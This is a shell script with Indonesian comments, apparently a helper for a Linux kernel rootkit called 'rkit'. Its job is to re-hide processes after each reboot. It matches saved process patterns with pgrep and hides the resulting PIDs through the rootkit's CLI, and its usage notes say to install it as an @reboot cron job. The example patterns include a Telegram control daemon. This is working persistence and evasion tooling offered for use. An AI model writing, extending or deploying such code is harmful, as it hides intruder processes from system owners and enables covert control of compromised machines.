#!/bin/sh
# rkit-rehide.sh — Sembunyikan ulang PID setelah reboot (otomatis).
#
# Masalah yang dipecahkan: hidepid TIDAK disimpan di state, sebab PID berubah
# tiap boot. Solusinya: simpan POLA proses (bukan PID) — PID baru dicari via
# pgrep lalu di-hide lewat CLI, aman meski nomornya berganti.
#
# Cara pakai:
#   1. tulis pola proses (satu per baris, dipakai `pgrep -f`) di:
#        /var/lib/rkit/rehide.patterns
#      contoh:
#        control/telegram/daemon.py
#        nama-folder-orang-lain
#      (baris kosong & diawali # diabaikan)
#   2. daftarkan sekali di cron:
#        @reboot sleep 20 && <path>/tools/rkit-rehide.sh
#   3. cek hasilnya:
#        rkit status   ->  hide_pids(...) berisi PID-PID baru
#
# Catatan:
#   - khusus backend MODERN (butuh /proc/rkit + CLI);
#     backend legacy (2.6-4.19) tetap atur hidepid= manual saat insmod
#   - ulangi juga kapan saja setelah start proses baru (tanpa reboot):
#        sh tools/rkit-rehide.sh
set -u

PATTERNS=/var/lib/rkit/rehide.patterns

# path repo dihitung dari lokasi skrip ini (tools/.. = root repo)
ROOT=$(cd "$(dirname "$0")/.." && pwd)
CLI="$ROOT/control/cli/rkit"

if [ ! -f "$PATTERNS" ]; then
	echo "rkit-rehide: $PATTERNS belum ada — tidak ada yang disembunyikan"
	exit 0
fi
if [ ! -x "$CLI" ]; then
	echo "rkit-rehide: CLI tak ditemukan ($CLI)" >&2
	echo "  -> backend legacy? atur hidepid= manual saat insmod" >&2
	exit 1
fi

n=0
while IFS= read -r pola; do
	case "$pola" in
	"" | \#*) continue ;;
	esac
	for pid in $(pgrep -f "$pola" 2>/dev/null); do
		if "$CLI" hide pid "$pid" >/dev/null 2>&1; then
			echo "rkit-rehide: hide pid $pid  (pola: $pola)"
			n=$((n + 1))
		fi
	done
done < "$PATTERNS"

echo "rkit-rehide: selesai — $n PID disembunyikan"
